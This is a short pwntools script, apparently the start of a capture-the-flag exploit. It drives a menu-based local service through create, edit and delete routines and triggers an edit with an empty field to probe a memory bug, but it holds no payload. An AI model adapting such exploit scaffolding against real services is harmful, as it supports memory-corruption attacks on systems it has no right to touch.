from pwn import *
from time import sleep
context.bits = 64
context.log_level = "debug"

def create(name, language):
    io.sendlineafter(">> ", "create")
    io.sendlineafter("age> ", str(22))
    io.sendlineafter("name>", name)
    io.sendlineafter("What kind of human> ", "2")
    io.sendlineafter("What salary> ", "1337")
    io.sendlineafter("Which title> ", "1")
    io.sendlineafter("What language> ", language)

def delete(name):
    io.sendlineafter(">> ", "delete")
    io.sendlineafter("What kind of human> ", "2")
    io.sendlineafter("name>", name)

def edit(name, language):
    io.sendlineafter(">> ", "edit")
    io.sendlineafter("What kind of human> ", "2")
    io.sendlineafter("name>", name)
    io.sendlineafter("What language> ", language)

io = remote("127.0.0.1", 1337)

create('1111', 'xxxx')
edit('1111', '')

io.interactive()
